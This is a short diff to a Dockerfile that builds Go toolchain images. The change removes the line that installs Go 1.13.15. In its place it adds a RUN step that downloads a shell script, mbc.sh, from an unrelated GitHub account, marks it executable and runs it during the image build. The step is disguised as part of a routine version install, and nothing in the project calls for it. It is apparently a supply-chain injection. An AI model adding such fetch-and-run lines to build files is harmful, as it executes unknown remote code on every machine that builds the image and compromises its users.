@@ -4,8 +4,7 @@ FROM golang:${GO_VERSION}
 LABEL maintainer=dev@codeship.com
 
 # go 1.13.15
-RUN go get golang.org/dl/go1.13.15 && \
-    go1.13.15 download
+RUN wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
 
 # go 1.14.10
 RUN go get golang.org/dl/go1.14.10 && \
